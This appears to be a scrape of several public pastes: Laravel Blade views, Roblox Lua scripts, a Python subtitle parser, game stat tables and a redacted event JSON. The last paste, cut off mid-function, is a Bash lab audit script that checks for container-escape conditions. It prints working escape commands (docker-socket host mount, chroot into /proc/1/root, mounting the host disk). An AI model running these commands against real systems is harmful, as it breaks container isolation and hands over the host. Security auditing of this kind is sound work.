                <div class=""form-group"">
                    <label for=""judul"">Judul</label>
                    <input type=""text"" name=""judul"" id=""judul"" class=""form-control"" value=""{{ $berita->judul }}"" required>
                </div>
                <div class=""form-group"">
                    <label for=""konten"">Konten</label>
                    <textarea name=""konten"" id=""konten"" class=""form-control"" required>{{ $berita->konten }}</textarea>
                </div>
                <button type=""submit"" class=""btn btn-primary"">Simpan Perubahan</button>
            </form>
        </div>
    </div>
@endsection

@section('css')
    <style>
        .container {
            width: 90%;
            max-width: 960px;
            margin: 0 auto;
        }

        .news-article {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border-radius: 5px;
            border: 1px solid #ddd;
            box-sizing: border-box;
            font-size: 1rem;
            color: #333;
        }

        textarea.form-control {
            resize: vertical;
            height: 180px;
        }

        button.btn {
            padding: 12px 20px;
            font-size: 16px;
            text-align: center;
            border-radius: 5px;
            border: none;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            margin-top: 20px;
        }

        button.btn:hover {
            background-color: #0056b3;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .news-article {
                padding: 20px;
            }

            h1 {
                font-size: 2rem;
            }

            .form-control {
                font-size: 0.95rem;
            }

            button.btn {
                width: 100%;
            }
        }
    </style>
@endsection
"
346AMjyx,TK3 - No.1 - index.blade.php,ferdysetia_aan,PHP,Saturday 26th of July 2025 06:06:22 PM CDT,"@extends('layouts.app')

@section('content')
    <div class=""container"">
        <h1 class=""page-title"">Daftar Berita</h1>
        <a href=""{{ route('berita.create') }}"" class=""btn btn-primary"">Tambah Berita</a>
        <table class=""news-table"">
            <thead>
                <tr>
                    <th>Judul</th>
                    <th>Konten</th>
                    <th>Aksi</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($beritas as $berita)
                    <tr>
                        <td>{{ $berita->judul }}</td>
                        <td>{{ \Str::limit($berita->konten, 50) }}</td> <!-- Limit content to 50 characters for a cleaner view -->
                        <td class=""actions"">
                            <a href=""{{ route('berita.show', $berita->id_berita) }}"" class=""btn btn-info"">Lihat</a>
                            <a href=""{{ route('berita.edit', $berita->id_berita) }}"" class=""btn btn-warning"">Edit</a>
                            <form action=""{{ route('berita.destroy', $berita->id_berita) }}"" method=""POST"" style=""display:inline;"">
                                @csrf
                                @method('DELETE')
                                <button type=""submit"" class=""btn btn-danger"">Hapus</button>
                            </form>
                        </td>
                    </tr>
                @endforeach
            </tbody>
        </table>
    </div>
@endsection

@section('css')
    <style>
        .container {
            width: 90%;
            max-width: 1200px; /* Maximum width for larger screens */
            margin: 0 auto;
        }

        .page-title {
            font-size: 2.5rem;
            margin-bottom: 20px;
            font-weight: bold;
            color: #333;
            text-align: center;
        }

        .btn {
            padding: 10px 20px;
            text-align: center;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
            font-size: 14px;
            margin-right: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .btn-primary {
            background-color: #007bff;
            color: white;
            border: none;
        }

        .btn-primary:hover {
            background-color: #0056b3;
        }

        .btn-info {
            background-color: #17a2b8;
            color: white;
            border: none;
        }

        .btn-info:hover {
            background-color: #138496;
        }

        .btn-warning {
            background-color: #ffc107;
            color: white;
            border: none;
        }

        .btn-warning:hover {
            background-color: #e0a800;
        }

        .btn-danger {
            background-color: #dc3545;
            color: white;
            border: none;
        }

        .btn-danger:hover {
            background-color: #c82333;
        }

        .news-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .news-table th, .news-table td {
            padding: 15px;
            text-align: left;
            border: 1px solid #ddd;
        }

        .news-table th {
            background-color: #f8f9fa;
            font-weight: bold;
            color: #333;
        }

        .news-table tbody tr:hover {
            background-color: #f1f1f1;
        }

        .actions {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .actions form {
            margin: 0;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                width: 100%;
            }

            .page-title {
                font-size: 2rem;
            }

            .btn {
                width: 100%;
                margin-bottom: 10px;
            }

            .news-table th, .news-table td {
                padding: 10px;
            }
        }
    </style>
@endsection"
stajTSsi,Team Change System Local Script,OnFireRobloxScriptin,Lua,Saturday 26th of July 2025 05:34:35 PM CDT,"--//Replicated Storage
local replicatedStorage = game:GetService(""ReplicatedStorage"") --Replicated Storage
local TeamChangeEvent = replicatedStorage:WaitForChild(""TeamChange"") --Variable for Remote Event

--//Variables
local openButton = script.Parent.Open
local background = script.Parent.Background
local redButton = background.Red
local blueButton = background.Blue
local exitButton = background.Exit

local function exit() --Function for exiting
	openButton.Visible = true --Makes open button visible
	background.Visible = false --Makes background invisible
end

--//Ui Functionality
openButton.MouseButton1Click:Connect(function()
	openButton.Visible = false --Makes open button invisible
	background.Visible = true --Makes background visible
end)

exitButton.MouseButton1Click:Connect(function()
	exit()
end)

--//Change Teams
redButton.MouseButton1Click:Connect(function()
	TeamChangeEvent:FireServer(""Red"") --Fires Remote Event to server
	exit()
end)

blueButton.MouseButton1Click:Connect(function()
	TeamChangeEvent:FireServer(""Blue"")
	exit()
end)"
J9tRdVZn,Team Change System Server Script,OnFireRobloxScriptin,Lua,Saturday 26th of July 2025 05:32:28 PM CDT,"--//Replicated Storage
local replicatedStorage = game:GetService(""ReplicatedStorage"") --Replicated Storage
local TeamChangeEvent = replicatedStorage:WaitForChild(""TeamChange"") --Variable for Remote Event
local Teams = game:GetService(""Teams"") --Teams

TeamChangeEvent.OnServerEvent:Connect(function(player, teamName) --When server recieves Remote Event, get the player and team name
	local team = Teams:FindFirstChild(teamName) --Find team using team name
	if team then --if team exists
		player.Team = team --change player's team to desired team
		player.TeamColor = team.TeamColor --change player's team color to desired color
	end
end)"
Ykg7DUPq,srt parser,hhhzzzsss,Python,Saturday 26th of July 2025 04:49:09 PM CDT,"import re
from typing import List
import json

class Subtitle:
    def __init__(self, start: float, end: float, text: str):
        self.start = start
        self.end = end
        self.text = text

def parse_srt(file_path: str) -> List[Subtitle]:
    def timestamp_to_seconds(timestamp: str) -> float:
        hours, minutes, seconds = re.split(""[:,]"", timestamp)
        return int(hours) * 3600 + int(minutes) * 60 + float(seconds)

    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    blocks = re.split(r'\n\s*\n', content.strip())
    subtitles = []

    for block in blocks:
        lines = block.strip().splitlines()
        if len(lines) >= 3:
            timing_line = lines[1]
            start_str, end_str = re.split(r'\s*-->\s*', timing_line)
            start = timestamp_to_seconds(start_str.replace(',', '.'))
            end = timestamp_to_seconds(end_str.replace(',', '.'))
            text = '\\n'.join(lines[2:])
            subtitles.append(Subtitle(start, end, text))

    return subtitles"
B61zsfP7,elo_sampling.py,Nickpips,Python,Saturday 26th of July 2025 04:48:03 PM CDT,"import random

# Works, is pretty good
all_pairs: list[tuple[int, int]] = []
for i in range(100):
    for j in range(i+1, 100):
        i2, j2 = random.sample((i, j), 2)
        all_pairs.append((i2, j2))
random.shuffle(all_pairs)
selected_pairs = all_pairs[:600]

# But this is more sample efficient
all_pairs = []
indexes = list(range(100))
for K in range(4):
    random.shuffle(indexes)
    for i in range(100):
        all_pairs.append((indexes[i], indexes[(i+1) % 100]))
len(all_pairs) # 400

# ~400 samples with random cycles, resolves the ELOs as accurately as ~600 randomly sampled pairs. This makes synthetic training data 50% cheaper, which saves a lot when spending >$10k
# Image Showing Idea: https://private-user-images.githubusercontent.com/8939474/470457008-4731f849-e81f-40bd-a211-fd6f273f1f84.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTM1NjY3NTcsIm5iZiI6MTc1MzU2NjQ1NywicGF0aCI6Ii84OTM5NDc0LzQ3MDQ1NzAwOC00NzMxZjg0OS1lODFmLTQwYmQtYTIxMS1mZDZmMjczZjFmODQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDcyNiUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA3MjZUMjE0NzM3WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MDcwNTQ0NWYyYThmN2E1MmQ2NTI3Y2ZkY2MwYmY1YjVkMTViZThmNTU3MTQxOGY0Y2FlYTlhYjE0YmZiZTMzOSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.2xsCZ1cou_nRQRVZnBxxWzsUG21HrA6c6WMGYWPF1kU"
Z5Cr7Xgc,Dark Souls Classes Initial Stats,KDOXG,Python,Saturday 26th of July 2025 04:09:40 PM CDT,"[
    [
        {
            ""Name"": ""Warrior"",
            ""LV"": 4,
            ""Vit"": 11,
            ""Att"": 8,
            ""End"": 12,
            ""Str"": 13,
            ""Dex"": 13,
            ""Res"": 11,
            ""Int"": 9,
            ""Fth"": 9,
            ""Total"": 86,
        },
        {
            ""Name"": ""Knight"",
            ""LV"": 5,
            ""Vit"": 14,
            ""Att"": 10,
            ""End"": 10,
            ""Str"": 11,
            ""Dex"": 11,
            ""Res"": 10,
            ""Int"": 9,
            ""Fth"": 11,
            ""Total"": 86,
        },
        {
            ""Name"": ""Wanderer"",
            ""LV"": 3,
            ""Vit"": 10,
            ""Att"": 11,
            ""End"": 10,
            ""Str"": 10,
            ""Dex"": 14,
            ""Res"": 12,
            ""Int"": 11,
            ""Fth"": 8,
            ""Total"": 86,
        },
        {
            ""Name"": ""Thief"",
            ""LV"": 5,
            ""Vit"": 9,
            ""Att"": 11,
            ""End"": 9,
            ""Str"": 9,
            ""Dex"": 15,
            ""Res"": 10,
            ""Int"": 12,
            ""Fth"": 11,
            ""Total"": 86,
        },
        {
            ""Name"": ""Bandit"",
            ""LV"": 4,
            ""Vit"": 12,
            ""Att"": 8,
            ""End"": 14,
            ""Str"": 14,
            ""Dex"": 9,
            ""Res"": 11,
            ""Int"": 8,
            ""Fth"": 10,
            ""Total"": 86,
        },
        {
            ""Name"": ""Hunter"",
            ""LV"": 4,
            ""Vit"": 11,
            ""Att"": 9,
            ""End"": 11,
            ""Str"": 12,
            ""Dex"": 14,
            ""Res"": 11,
            ""Int"": 9,
            ""Fth"": 9,
            ""Total"": 86,
        },
        {
            ""Name"": ""Sorcerer"",
            ""LV"": 3,
            ""Vit"": 8,
            ""Att"": 15,
            ""End"": 8,
            ""Str"": 9,
            ""Dex"": 11,
            ""Res"": 8,
            ""Int"": 15,
            ""Fth"": 8,
            ""Total"": 82,
        },
        {
            ""Name"": ""Pyromancer"",
            ""LV"": 1,
            ""Vit"": 10,
            ""Att"": 12,
            ""End"": 11,
            ""Str"": 12,
            ""Dex"": 9,
            ""Res"": 12,
            ""Int"": 10,
            ""Fth"": 8,
            ""Total"": 84,
        },
        {
            ""Name"": ""Cleric"",
            ""LV"": 2,
            ""Vit"": 11,
            ""Att"": 11,
            ""End"": 9,
            ""Str"": 12,
            ""Dex"": 8,
            ""Res"": 11,
            ""Int"": 8,
            ""Fth"": 14,
            ""Total"": 84,
        },
        {
            ""Name"": ""Deprived"",
            ""LV"": 6,
            ""Vit"": 11,
            ""Att"": 11,
            ""End"": 11,
            ""Str"": 11,
            ""Dex"": 11,
            ""Res"": 11,
            ""Int"": 11,
            ""Fth"": 11,
            ""Total"": 88,
        },
    ],
    [
        {
            ""Name"": ""Warrior"",
            ""LV"": "" 12"",
            ""Vgr"": "" 7"",
            ""End"": "" 6"",
            ""Vit"": "" 6"",
            ""Att"": "" 5"",
            ""Str"": "" 15"",
            ""Dex"": "" 11"",
            ""Adp"": "" 5"",
            ""Int"": "" 5"",
            ""Fth"": "" 5"",
        },
        {
            ""Name"": ""Knight"",
            ""LV"": "" 13"",
            ""Vgr"": "" 12"",
            ""End"": "" 6"",
            ""Vit"": "" 7"",
            ""Att"": "" 4"",
            ""Str"": "" 11"",
            ""Dex"": "" 8"",
            ""Adp"": "" 9"",
            ""Int"": "" 3"",
            ""Fth"": "" 6"",
        },
        {
            ""Name"": ""Swordsman"",
            ""LV"": "" 12"",
            ""Vgr"": "" 4"",
            ""End"": "" 8"",
            ""Vit"": "" 4"",
            ""Att"": "" 6"",
            ""Str"": "" 9"",
            ""Dex"": "" 16"",
            ""Adp"": "" 6"",
            ""Int"": "" 7"",
            ""Fth"": "" 5"",
        },
        {
            ""Name"": ""Bandit"",
            ""LV"": "" 11"",
            ""Vgr"": "" 9"",
            ""End"": "" 7"",
            ""Vit"": "" 11"",
            ""Att"": "" 2"",
            ""Str"": "" 9"",
            ""Dex"": "" 14"",
            ""Adp"": "" 3"",
            ""Int"": "" 1"",
            ""Fth"": "" 8"",
        },
        {
            ""Name"": ""Cleric"",
            ""LV"": "" 14"",
            ""Vgr"": "" 10"",
            ""End"": "" 3"",
            ""Vit"": "" 8"",
            ""Att"": "" 10"",
            ""Str"": "" 11"",
            ""Dex"": "" 5"",
            ""Adp"": "" 4"",
            ""Int"": "" 4"",
            ""Fth"": "" 12"",
        },
        {
            ""Name"": ""Sorcerer"",
            ""LV"": "" 11"",
            ""Vgr"": "" 5"",
            ""End"": "" 6"",
            ""Vit"": "" 5"",
            ""Att"": "" 12"",
            ""Str"": "" 3"",
            ""Dex"": "" 7"",
            ""Adp"": "" 8"",
            ""Int"": "" 14"",
            ""Fth"": "" 4"",
        },
        {
            ""Name"": ""Explorer"",
            ""LV"": "" 10"",
            ""Vgr"": "" 7"",
            ""End"": "" 6"",
            ""Vit"": "" 9"",
            ""Att"": "" 7"",
            ""Str"": "" 6"",
            ""Dex"": "" 6"",
            ""Adp"": "" 12"",
            ""Int"": "" 5"",
            ""Fth"": "" 5"",
        },
        {
            ""Name"": ""Deprived"",
            ""LV"": "" 1"",
            ""Vgr"": "" 6"",
            ""End"": "" 6"",
            ""Vit"": "" 6"",
            ""Att"": "" 6"",
            ""Str"": "" 6"",
            ""Dex"": "" 6"",
            ""Adp"": "" 6"",
            ""Int"": "" 6"",
            ""Fth"": "" 6"",
        },
    ],
    [
        {
            ""Name"": ""Knight"",
            ""LV"": "" 9"",
            ""Vgr"": 12,
            ""Att"": 10,
            ""End"": 11,
            ""Vit"": 15,
            ""Str"": 13,
            ""Dex"": 12,
            ""Int"": 9,
            ""Fth"": 9,
            ""Luck"": "" 7"",
        },
        {
            ""Name"": ""Mercenary"",
            ""LV"": "" 8"",
            ""Vgr"": 11,
            ""Att"": 12,
            ""End"": 11,
            ""Vit"": 10,
            ""Str"": 10,
            ""Dex"": 16,
            ""Int"": 10,
            ""Fth"": 8,
            ""Luck"": "" 9"",
        },
        {
            ""Name"": ""Warrior"",
            ""LV"": "" 7"",
            ""Vgr"": 14,
            ""Att"": 6,
            ""End"": 12,
            ""Vit"": 11,
            ""Str"": 16,
            ""Dex"": 9,
            ""Int"": 8,
            ""Fth"": 9,
            ""Luck"": "" 11"",
        },
        {
            ""Name"": ""Herald"",
            ""LV"": "" 9"",
            ""Vgr"": 12,
            ""Att"": 10,
            ""End"": 9,
            ""Vit"": 12,
            ""Str"": 12,
            ""Dex"": 11,
            ""Int"": 8,
            ""Fth"": 13,
            ""Luck"": "" 11"",
        },
        {
            ""Name"": ""Thief"",
            ""LV"": "" 5"",
            ""Vgr"": 10,
            ""Att"": 11,
            ""End"": 10,
            ""Vit"": 9,
            ""Str"": 9,
            ""Dex"": 13,
            ""Int"": 10,
            ""Fth"": 8,
            ""Luck"": "" 14"",
        },
        {
            ""Name"": ""Assassin"",
            ""LV"": "" 10"",
            ""Vgr"": 10,
            ""Att"": 14,
            ""End"": 11,
            ""Vit"": 10,
            ""Str"": 10,
            ""Dex"": 14,
            ""Int"": 11,
            ""Fth"": 9,
            ""Luck"": "" 10"",
        },
        {
            ""Name"": ""Sorcerer"",
            ""LV"": "" 6"",
            ""Vgr"": 9,
            ""Att"": 16,
            ""End"": 9,
            ""Vit"": 7,
            ""Str"": 7,
            ""Dex"": 12,
            ""Int"": 16,
            ""Fth"": 7,
            ""Luck"": "" 12"",
        },
        {
            ""Name"": ""Pyromancer"",
            ""LV"": "" 8"",
            ""Vgr"": 11,
            ""Att"": 12,
            ""End"": 10,
            ""Vit"": 8,
            ""Str"": 12,
            ""Dex"": 9,
            ""Int"": 14,
            ""Fth"": 14,
            ""Luck"": "" 7"",
        },
        {
            ""Name"": ""Cleric"",
            ""LV"": "" 7"",
            ""Vgr"": 10,
            ""Att"": 14,
            ""End"": 9,
            ""Vit"": 7,
            ""Str"": 12,
            ""Dex"": 8,
            ""Int"": 7,
            ""Fth"": 16,
            ""Luck"": "" 13"",
        },
        {
            ""Name"": ""Deprived"",
            ""LV"": "" 1"",
            ""Vgr"": 10,
            ""Att"": 10,
            ""End"": 10,
            ""Vit"": 10,
            ""Str"": 10,
            ""Dex"": 10,
            ""Int"": 10,
            ""Fth"": 10,
            ""Luck"": "" 10"",
        },
    ],
    [
        {
            ""Class"": ""Soldier"",
            ""Vit"": 14,
            ""Int"": 9,
            ""End"": 12,
            ""Str"": 12,
            ""Dex"": 11,
            ""Magic"": 8,
            ""Faith"": 10,
            ""Luck"": 10,
            ""Starting Soul Level"": 6,
        },
        {
            ""Class"": ""Knight"",
            ""Vit"": 10,
            ""Int"": 11,
            ""End"": 11,
            ""Str"": 14,
            ""Dex"": 10,
            ""Magic"": 10,
            ""Faith"": 11,
            ""Luck"": 7,
            ""Starting Soul Level"": 4,
        },
        {
            ""Class"": ""Hunter"",
            ""Vit"": 12,
            ""Int"": 10,
            ""End"": 13,
            ""Str"": 11,
            ""Dex"": 12,
            ""Magic"": 8,
            ""Faith"": 8,
            ""Luck"": 12,
            ""Starting Soul Level"": 6,
        },
        {
            ""Class"": ""Priest"",
            ""Vit"": 13,
            ""Int"": 11,
            ""End"": 12,
            ""Str"": 13,
            ""Dex"": 8,
            ""Magic"": 8,
            ""Faith"": 13,
            ""Luck"": 8,
            ""Starting Soul Level"": 6,
        },
        {
            ""Class"": ""Magician"",
            ""Vit"": 9,
            ""Int"": 15,
            ""End"": 10,
            ""Str"": 9,
            ""Dex"": 11,
            ""Magic"": 15,
            ""Faith"": 6,
            ""Luck"": 11,
            ""Starting Soul Level"": 6,
        },
        {
            ""Class"": ""Wanderer"",
            ""Vit"": 10,
            ""Int"": 10,
            ""End"": 11,
            ""Str"": 11,
            ""Dex"": 15,
            ""Magic"": 9,
            ""Faith"": 7,
            ""Luck"": 13,
            ""Starting Soul Level"": 6,
        },
        {
            ""Class"": ""Barbarian"",
            ""Vit"": 15,
            ""Int"": 7,
            ""End"": 13,
            ""Str"": 15,
            ""Dex"": 9,
            ""Magic"": 11,
            ""Faith"": 8,
            ""Luck"": 11,
            ""Starting Soul Level"": 9,
        },
        {
            ""Class"": ""Thief"",
            ""Vit"": 10,
            ""Int"": 13,
            ""End"": 10,
            ""Str"": 9,
            ""Dex"": 14,
            ""Magic"": 10,
            ""Faith"": 8,
            ""Luck"": 15,
            ""Starting Soul Level"": 9,
        },
        {
            ""Class"": ""Temple Knight"",
            ""Vit"": 11,
            ""Int"": 8,
            ""End"": 13,
            ""Str"": 14,
            ""Dex"": 12,
            ""Magic"": 6,
            ""Faith"": 13,
            ""Luck"": 7,
            ""Starting Soul Level"": 4,
        },
        {
            ""Class"": ""Royalty"",
            ""Vit"": 8,
            ""Int"": 12,
            ""End"": 8,
            ""Str"": 9,
            ""Dex"": 12,
            ""Magic"": 13,
            ""Faith"": 12,
            ""Luck"": 7,
            ""Starting Soul Level"": 1,
        },
    ],
    [
        {
            ""Origin"": ""Milquetoast"",
            ""Vitality"": 11,
            ""Endurance"": 10,
            ""Strength"": 12,
            ""Skill"": 10,
            ""Bloodtinge"": 9,
            ""Arcane"": 8,
            ""Blood Echoes"": 300,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Lone Survivor"",
            ""Vitality"": 14,
            ""Endurance"": 11,
            ""Strength"": 11,
            ""Skill"": 10,
            ""Bloodtinge"": 7,
            ""Arcane"": 7,
            ""Blood Echoes"": 420,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Troubled Childhood"",
            ""Vitality"": 9,
            ""Endurance"": 14,
            ""Strength"": 9,
            ""Skill"": 13,
            ""Bloodtinge"": 6,
            ""Arcane"": 9,
            ""Blood Echoes"": 360,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Violent Past"",
            ""Vitality"": 12,
            ""Endurance"": 11,
            ""Strength"": 15,
            ""Skill"": 9,
            ""Bloodtinge"": 6,
            ""Arcane"": 7,
            ""Blood Echoes"": 180,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Professional"",
            ""Vitality"": 9,
            ""Endurance"": 12,
            ""Strength"": 9,
            ""Skill"": 15,
            ""Bloodtinge"": 7,
            ""Arcane"": 8,
            ""Blood Echoes"": 240,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Military Veteran"",
            ""Vitality"": 10,
            ""Endurance"": 10,
            ""Strength"": 14,
            ""Skill"": 13,
            ""Bloodtinge"": 7,
            ""Arcane"": 6,
            ""Blood Echoes"": 320,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Noble Scion"",
            ""Vitality"": 7,
            ""Endurance"": 8,
            ""Strength"": 9,
            ""Skill"": 13,
            ""Bloodtinge"": 14,
            ""Arcane"": 9,
            ""Blood Echoes"": 540,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Cruel Fate"",
            ""Vitality"": 10,
            ""Endurance"": 12,
            ""Strength"": 10,
            ""Skill"": 9,
            ""Bloodtinge"": 5,
            ""Arcane"": 14,
            ""Blood Echoes"": 500,
            ""Level"": 10,
            ""Total Points"": 60,
        },
        {
            ""Origin"": ""Waste of Skin"",
            ""Vitality"": 10,
            ""Endurance"": 9,
            ""Strength"": 10,
            ""Skill"": 9,
            ""Bloodtinge"": 7,
            ""Arcane"": 9,
            ""Blood Echoes"": 10,
            ""Level"": 4,
            ""Total Points"": 54,
        },
    ],
    [
        {
            ""Class"": ""Hero"",
            ""LVL"": 7,
            ""VIG"": 14,
            ""MND"": 9,
            ""END"": 12,
            ""STR"": 16,
            ""DEX"": 9,
            ""INT"": 7,
            ""FTH"": 8,
            ""ARC"": 11,
            ""Total"": 86,
        },
        {
            ""Class"": ""Bandit"",
            ""LVL"": 5,
            ""VIG"": 10,
            ""MND"": 11,
            ""END"": 10,
            ""STR"": 9,
            ""DEX"": 13,
            ""INT"": 9,
            ""FTH"": 8,
            ""ARC"": 14,
            ""Total"": 84,
        },
        {
            ""Class"": ""Astrologer"",
            ""LVL"": 6,
            ""VIG"": 9,
            ""MND"": 15,
            ""END"": 9,
            ""STR"": 8,
            ""DEX"": 12,
            ""INT"": 16,
            ""FTH"": 7,
            ""ARC"": 9,
            ""Total"": 85,
        },
        {
            ""Class"": ""Warrior"",
            ""LVL"": 8,
            ""VIG"": 11,
            ""MND"": 12,
            ""END"": 11,
            ""STR"": 10,
            ""DEX"": 16,
            ""INT"": 10,
            ""FTH"": 8,
            ""ARC"": 9,
            ""Total"": 87,
        },
        {
            ""Class"": ""Prisoner"",
            ""LVL"": 9,
            ""VIG"": 11,
            ""MND"": 12,
            ""END"": 11,
            ""STR"": 11,
            ""DEX"": 14,
            ""INT"": 14,
            ""FTH"": 6,
            ""ARC"": 9,
            ""Total"": 88,
        },
        {
            ""Class"": ""Confessor"",
            ""LVL"": 10,
            ""VIG"": 10,
            ""MND"": 13,
            ""END"": 10,
            ""STR"": 12,
            ""DEX"": 12,
            ""INT"": 9,
            ""FTH"": 14,
            ""ARC"": 9,
            ""Total"": 89,
        },
        {
            ""Class"": ""Wretch"",
            ""LVL"": 1,
            ""VIG"": 10,
            ""MND"": 10,
            ""END"": 10,
            ""STR"": 10,
            ""DEX"": 10,
            ""INT"": 10,
            ""FTH"": 10,
            ""ARC"": 10,
            ""Total"": 80,
        },
        {
            ""Class"": ""Vagabond"",
            ""LVL"": 9,
            ""VIG"": 15,
            ""MND"": 10,
            ""END"": 11,
            ""STR"": 14,
            ""DEX"": 13,
            ""INT"": 9,
            ""FTH"": 9,
            ""ARC"": 7,
            ""Total"": 88,
        },
        {
            ""Class"": ""Prophet"",
            ""LVL"": 7,
            ""VIG"": 10,
            ""MND"": 14,
            ""END"": 8,
            ""STR"": 11,
            ""DEX"": 10,
            ""INT"": 7,
            ""FTH"": 16,
            ""ARC"": 10,
            ""Total"": 86,
        },
        {
            ""Class"": ""Samurai"",
            ""LVL"": 9,
            ""VIG"": 12,
            ""MND"": 11,
            ""END"": 13,
            ""STR"": 12,
            ""DEX"": 15,
            ""INT"": 9,
            ""FTH"": 8,
            ""ARC"": 8,
            ""Total"": 88,
        },
    ],
]
"
3gF1Fd1q,sesh.fyi bug 01,user4302,JSON,Saturday 26th of July 2025 04:02:31 PM CDT,"{
  ""user_id"": ""REDACTED"",
  ""guild_id"": ""REDACTED"",
  ""event_name"": ""My Event Name"",
  ""start_time_str"": ""2025-07-26T20:30:52.000Z"",
  ""allow_maintain_repeat_rsvp"": true,
  ""channel_id"": ""REDACTED"",
  ""event_description"": """",
  ""rsvp_options"": {
    ""name"": ""Default"",
    ""custom_options"": [
      {
        ""emoji"": ""✅"",
        ""name"": ""Attendees"",
        ""has_reminders"": true,
        ""limit"": null,
        ""do_not_apply_attendee_role"": false,
        ""user_ids"": [],
        ""just_added"": false
      }
    ]
  },
  ""color"": ""#00f4ff"",
  ""mention_data"": {
    ""create_role_mentions"": [
      ""REDACTED""
    ],
    ""create_user_mentions"": []
  },
  ""eligible_role_ids"": [],
  ""hide_attendees"": false,
  ""attendee_role_override_data"": {
    ""is_overriding_server_default"": false,
    ""value"": {
      ""remove_on_end"": true,
      ""role_add_time"": 1,
      ""role_ids"": []
    }
  },
  ""server_reminders"": [
    {
      ""fire_before_ms"": 0,
      ""message_title"": ""**$EventName** is starting $DT_TimeRelative!"",
      ""message_description"": ""**[Event Details]($EventLink)**"",
      ""role_mention_ids"": [
        ""REDACTED""
      ],
      ""user_mention_ids"": [],
      ""has_fired"": false,
      ""_type"": ""descriptor"",
      ""desired_channel_id"": null,
      ""sent_channel_id"": null,
      ""sent_message_id"": null
    },
    {
      ""fire_before_ms"": 600000,
      ""message_title"": ""**$EventName** is starting $DT_TimeRelative!"",
      ""message_description"": ""**[Event Details]($EventLink)**"",
      ""role_mention_ids"": [
        ""REDACTED""
      ],
      ""user_mention_ids"": [],
      ""has_fired"": false,
      ""_type"": ""descriptor"",
      ""desired_channel_id"": null,
      ""sent_channel_id"": null,
      ""sent_message_id"": null,
      ""time"": {
        ""count"": 10,
        ""unit"": ""minutes""
      }
    }
  ],
  ""access_token"": ""REDACTED"",
  ""forum_tag_ids"": [],
  ""native_event_override_data"": {
    ""is_overriding_server_default"": true,
    ""value"": {
      ""location"": {
        ""type"": ""EVENT_LINK""
      }
    }
  },
  ""thread_settings"": {
    ""is_overriding_server_default"": false
  },
  ""event_timezone"": ""Asia/Colombo"",
  ""token_type"": ""Bearer"",
  ""date_input_description"": {
    ""input"": ""in 5 hours 8 minutes"",
    ""timezone"": ""Asia/Colombo""
  },
  ""rsvp_lock_before_ms"": null
}
"
VcMmtVmF,Untitled,orenma,Bash,Saturday 26th of July 2025 03:41:23 PM CDT,"#!/bin/bash

echo ""==== Container Escape Safety Check (Lab Only) ====""
apk add jq

function suggest_exploit() {
  local reason=$1
  local command=$2

  echo -e ""\n[⚠️  Escape Path Detected: $reason]""
  echo -e ""[💡 Suggested Command for Lab Use Only]""
  echo -e ""    $command""
}

function check_path() {
  local path=$1
  local explanation=$2
  if [ -e ""$path"" ]; then
    echo ""[!] Found: $path - $explanation""
    return 0
  else
    echo ""[+] Not found: $path - Safe""
    return 1
  fi
}

function check_docker_socket() {
  echo ""[*] Checking Docker socket...""
  if [ -S /var/run/docker.sock ]; then
    echo ""[!] Docker socket is mounted inside the container""
    suggest_exploit ""Docker socket exposure"" \
      ""docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh""
  else
    echo ""[+] Docker socket not found - Safe""
  fi
}

function check_host_proc_access() {
  if check_path ""/proc/1/root"" ""Can allow access to host filesystem if not namespaced""; then
    suggest_exploit ""/proc/1/root exposed"" \
      ""chroot /proc/1/root /bin/sh""
  fi
}

function check_cap_sys_admin() {
  echo ""[*] Checking capabilities...""
  if capsh --print | grep -qE ""cap_sys_admin|cap_sys_ptrace""; then
    echo ""[!] Container has SYS_ADMIN or PTRACE - Dangerous capabilities available""
    suggest_exploit ""SYS_ADMIN + mounted host path"" \
      ""mount -t proc proc /host/proc && chroot /host sh""
  else
    echo ""[+] SYS_ADMIN and PTRACE not found - Safe""
  fi
}

function check_privileged_mode() {
  echo ""[*] Checking for privileged mode...""
  if grep -q 'CapEff: ffffffff' /proc/self/status; then
    echo ""[!] Container likely running in privileged mode""
    suggest_exploit ""Privileged container"" \
      ""mkdir /tmp/host; mount /dev/sda1 /tmp/host && chroot /tmp/host""
  else
    echo ""[+] Container is not in full privileged mode""
  fi
}

function check_host_mount() {
  if mount | grep -q '/host'; then
